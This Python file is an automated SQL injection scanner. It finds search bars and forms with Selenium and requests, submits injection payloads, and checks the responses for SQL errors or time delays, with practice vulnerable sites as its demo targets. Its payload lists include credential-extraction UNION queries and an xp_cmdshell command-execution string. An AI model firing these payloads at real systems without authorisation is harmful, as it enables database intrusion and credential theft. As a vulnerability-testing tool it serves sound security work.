from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, TimeoutException, ElementNotInteractableException
import time
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import sqlmapchecker
from selenium.webdriver.chrome.options import Options as ChromeOptions


def find_search_bar(browser, url, method):
    browser.get(url)
    try_methods = [
        ("css_selector", "input[type='text']"),
        ("name", "q"),
        ("name", "email"),
        ("id", "search-bar"),
        ("css_selector", "input[type='search']")
    ]
    if method:
        try_methods = method

    # Attempt to find and verify search bar in main content
    found_search_bar = try_methods_for_search_bar(browser, try_methods)
    if found_search_bar[0]:
        return found_search_bar

    # Fallback: attempt to find and verify search bar within frames
    browser.switch_to.default_content()  # Ensure starting from the main document
    frames = browser.find_elements(By.TAG_NAME, "iframe") + browser.find_elements(By.TAG_NAME, "frame")

    for frame in frames:
        try:
            browser.switch_to.frame(frame)
            found_search_bar = try_methods_for_search_bar(browser, try_methods)
            if found_search_bar and found_search_bar[
                0]:  # Check if found_search_bar is not None and has a found element
                return found_search_bar
        except Exception as e:
            print(f"Error switching to frame: {e}")
        finally:
            browser.switch_to.default_content()  # Always switch back to the main content after each frame

    print("Search bar not found in any frame or the main content.")
    return [None, None, None]


def try_methods_for_search_bar(browser, try_methods):
    for method, value in try_methods:
        search_bar = try_find_search_bar(browser, method, value)
        if search_bar[0]:
            return search_bar
    return [None, None, None]  # Ensure it returns a list even when not found


def try_find_search_bar(browser, method, value):
    try:
        search_bar = WebDriverWait(browser, 15).until(
            EC.presence_of_element_located((getattr(By, method.upper()), value))
        )
        # Verify it's interactable
        try:
            search_bar.send_keys("Test")
            search_bar.clear()  # Clear the test input
            # print(f"Found interactable search bar using {method}='{value}'.")
            return [search_bar, method, value]
        except ElementNotInteractableException:
            # print(f"Search bar found but not interactable using {method}='{value}'.")
            return [None, None, None]
    except (NoSuchElementException, TimeoutException) as e:
        # print(f"Search bar not found using {method}='{value}'.")
        # Reason: {e}")
        return [None, None, None]


def analyze_response(browser):
    error_indicators = [
        "you have an error in your sql syntax;",
        "warning: mysql_fetch",
        "unclosed quotation mark",
        "microsoft ole db provider for sql server error '80040e14'",
        "unclosed quotation mark after the character string",
        "pg::syntaxerror",
        "org.hibernate.exception.sqlgrammarexception:"
    ]
    page_source = browser.page_source.lower()
    for error in error_indicators:
        if error in page_source:
            return True, "Potential SQL Injection vulnerability detected due to error message."
    return False, "No clear vulnerability detected based on error message checks."


def test_sqli_payloads(browser, url, search_bar):
    # Define your payloads here
    response_dependent_payloads = [
        "' OR '1'='1",  # Simple and effective always true condition.
        "' OR 1=1--",  # Common always true condition with comment.
        "'; EXECUTE IMMEDIATE 'SELECT * FROM users; --",  # Potentially dangerous SQL commands.
        "' UNION SELECT username, password FROM users--",  # Extract critical data.
        "' AND SLEEP(5)--",  # Simple delay to check for blind SQLi.
        "1'; WAITFOR DELAY '00:00:10'--",  # SQL Server specific delay.
        "1' AND 1=2 UNION SELECT NULL, version()--",  # Fetch database version using a condition that is false.
    ]
    time_based_payloads = [
        "' OR SLEEP(45)-- -",  # Long delay for MySQL.
        "'; WAITFOR DELAY '0:0:45'--",  # Long delay for SQL Server.
        "1'; EXEC xp_cmdshell('whoami')--",  # SQL Server command execution.
        "'; SELECT pg_sleep(45)--",  # Long delay for PostgreSQL.
    ]

    results = []
    found = False

    # Test response-dependent payloads
    for payload in response_dependent_payloads:
        try:
            search_bar.clear()
            search_bar.send_keys(payload + Keys.ENTER)
            time.sleep(5)  # Adjust based on expected page load time
            vulnerable, result_message = analyze_response(browser)
            results.append((payload, result_message))
            if vulnerable:
                found = True
            browser.back()
            time.sleep(2)  # Adjust for page navigation
        except Exception as e:
            results.append((payload, str(e)))

    # Test time-based payloads
    for payload in time_based_payloads:
        try:
            start_time = time.time()
            search_bar.clear()
            search_bar.send_keys(payload + Keys.ENTER)
            # Wait for a time longer than the expected delay to ensure detection
            time.sleep(50)  # Adjust based on the expected delay of the payload
            elapsed_time = time.time() - start_time
            if elapsed_time - 45 > 3:  # Threshold for confirming delay
                results.append((payload, "Potential SQL Injection vulnerability detected through time delay."))
                found = True
            else:
                results.append((payload, "No significant delay detected."))
            browser.back()
            time.sleep(2)
        except Exception as e:
            results.append((payload, str(e)))

    return results, found


def configure_chrome():
    chrome_options = ChromeOptions()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-experiments")
    chrome_options.add_argument("--ignore-gpu-blacklist")
    chrome_options.add_argument("--disable-default-apps")

    driver = webdriver.Chrome(options=chrome_options)
    return driver


def check_sqli_in_searchbar(url):
    browser = configure_chrome()

    try:
        search_bar = find_search_bar(browser, url, None)[0]  # Assume find_search_bar is defined elsewhere
        if search_bar:
            results, found = test_sqli_payloads(browser, url, search_bar)
            if found:
                print("SQL Injection vulnerability detected")
                return True
            else:
                print("No SQL injection vulnerability detected.")
                return False
        else:
            print("Search bar not found.")
            return False
    except Exception as e:
        print(f"An unexpected error occurred: {str(e)}")
        return False
    finally:
        browser.quit()


def request_session(user_agent="Mozilla/5.0"):
    session = requests.Session()
    session.headers['User-Agent'] = user_agent
    return session


def find_forms(html):
    soup = BeautifulSoup(html, "html.parser")
    return soup.find_all("form")


def form_details(form):
    details = {
        "action": form.attrs.get("action", "").lower(),
        "method": form.attrs.get("method", "get").lower(),
        "inputs": []
    }
    form_fields = form.find_all(['input', 'textarea', 'select'])
    for field in form_fields:
        if field.name:
            input_details = {
                "type": field.attrs.get("type", "text"),
                "name": field.name,
                "value": field.attrs.get("value", "")
            }
            if field.name and field.name not in [input['name'] for input in details['inputs']]:
                details["inputs"].append(input_details)
    return details


def is_vulnerable(response):
    error_messages = [
        "you have an error in your sql syntax;",
        "warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated",
    ]
    return any(error in response.text.lower() for error in error_messages)


def scan_sql_injection(url, session):
    # print(f"Testing URL: {url}")

    # Test vulnerability in the URL
    if is_sql_injection_vulnerable_by_url(url, session):
        print("SQL Injection vulnerability detected in URL.")
        return True

    # Test the forms on the page
    try:
        response = session.get(url)
        forms = find_forms(response.text)
        # print(f"Found {len(forms)} forms on {url}.")
        for form in forms:
            form_info = form_details(form)
            content_type = response.headers.get('Content-Type')
            if is_vulnerable_form(url, form_info, session, content_type):
                print(f"SQL Injection vulnerability detected in form")
                return True
    except requests.exceptions.RequestException as e:
        print(f"Error fetching the URL: {e}")
        return False


def is_vulnerable_form(base_url, form, session, content_type):
    action = urljoin(base_url, form['action'])
    data = {}
    for input in form['inputs']:
        data[input['name']] = "test" + "'"
    if form['method'] == 'post':
        res = session.post(action, data=data)
    else:
        res = session.get(action, params=data)
    return is_vulnerable(res)


def is_sql_injection_vulnerable_by_url(url, session):
    payloads = ["'", '"', '--', '#', ' OR 1=1']
    for payload in payloads:
        test_url = f"{url}{payload}"
        try:
            response = session.get(test_url)
            if is_vulnerable(response):
                return True
        except requests.exceptions.RequestException as e:
            print(f"Failed to send request: {e}")
    return False


# Initialize session
s = requests.Session()
s.headers[
    "User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"


def get_forms(url):
    """ Retrieve all forms from the webpage """
    try:
        response = s.get(url)
        response.raise_for_status()  # Check for HTTP request errors
        soup = BeautifulSoup(response.content, "html.parser")
        return soup.find_all("form")
    except requests.RequestException as e:
        print(f"Error fetching {url}: {e}")
        return []


def vulnerable(response):
    """ Check if the response contains SQL error messages """
    errors = {
        "quoted string not properly terminated",
        "unclosed quotation mark after the character string",
        "you have an error in your SQL syntax"
    }
    content = response.content.decode().lower()
    return any(error in content for error in errors)


def sql_injection_scan(url):
    """ Scan each form for SQL injection vulnerabilities """
    forms = get_forms(url)
    # print(f"[+] Detected {len(forms)} forms on {url}.")

    for form in forms:
        details = form_details(form)
        for i in "\"'":
            data = {}
            for input_tag in details["inputs"]:
                if input_tag["type"] == "hidden" or input_tag["value"]:
                    data[input_tag['name']] = input_tag["value"] + i
                elif input_tag["type"] != "submit":
                    data[input_tag['name']] = f"test{i}"
            target_url = urljoin(url, details["action"])
            try:
                if details["method"] == "post":
                    res = s.post(target_url, data=data)
                else:
                    res = s.get(target_url, params=data)
                if vulnerable(res):
                    print(f"SQL injection vulnerability detected in form")
                    return True
                else:
                    print("No SQL injection vulnerability detected.")
                    return False
            except requests.RequestException as e:
                print(f"Request to {target_url} failed: {e}")
                return False


def run_tests(test_url):
    results = 0  # Initialize the test1 count to 0
    session = request_session()  # Make sure request_session() is properly defined or imported

    # Assuming these functions are defined and return True if the test passes
    test1 = sql_injection_scan(test_url)
    test2 = scan_sql_injection(test_url, session)
    test3 = check_sqli_in_searchbar(test_url)
    test4 = sqlmapchecker.is_vulnerable_to_sqli(test_url)  # Ensure sqlmapchecker is defined/imported

    # Increment test1 count for each passed test
    if test1:
        results += 1
    if test2:
        results += 1
    if test3:
        results += 1
    if test4:
        results += 1

    return results


if __name__ == '__main__':
    test_urls = ["http://testphp.vulnweb.com/artists.php?artist=1",
                 "https://demo.testfire.net"]

    print(run_tests(test_urls[0]))

    """Selenium-Based Search Bar SQL Injection Test (check_sqli_in_searchbar):
    Purpose: To detect SQL Injection vulnerabilities through a web page's search bar using automated browser interactions.
    Method: Uses Selenium WebDriver to navigate the web page, identify a search bar, and inject SQL payloads. It checks for typical SQL error responses or unusual behaviors (like delays) that indicate SQL Injection vulnerabilities.
    Payloads: Includes a mixture of straightforward SQL injection strings and time-based payloads to attempt both error-based and blind SQL Injection.
    
    Request-Based Form SQL Injection Test (scan_sql_injection):
    Purpose: To evaluate forms found on the web page for SQL Injection vulnerabilities using HTTP requests.
    Method: Fetches the web page, parses out forms, and sends modified form data with SQL injection payloads. It checks server responses for typical SQL error messages.
    Details: It constructs data payloads by appending SQL injection prone characters to input values and posts back to the form's action URL to see if the server handles inputs safely.
    
    Independent Form SQL Injection Scan (sql_injection_scan):
    Purpose: Similar to the previous, but possibly intended as a more focused or alternative approach to scan each form individually for SQL Injection vulnerabilities.
    Method: This method again fetches forms from a given URL, modifies the inputs with SQL Injection strings, submits the forms, and checks for SQL error messages in the responses.
    
    External SQLMap Check (sqlmapchecker.is_vulnerable_to_sqli):
    Purpose: To use an external tool or module, presumably named sqlmapchecker, which could be an abstraction over the popular SQLMap tool used for detecting and exploiting SQL Injection flaws.
    Method: This likely sends various types of SQL injection payloads through the given URL and observes the responses, leveraging SQLMap's extensive database and techniques for SQL Injection."""
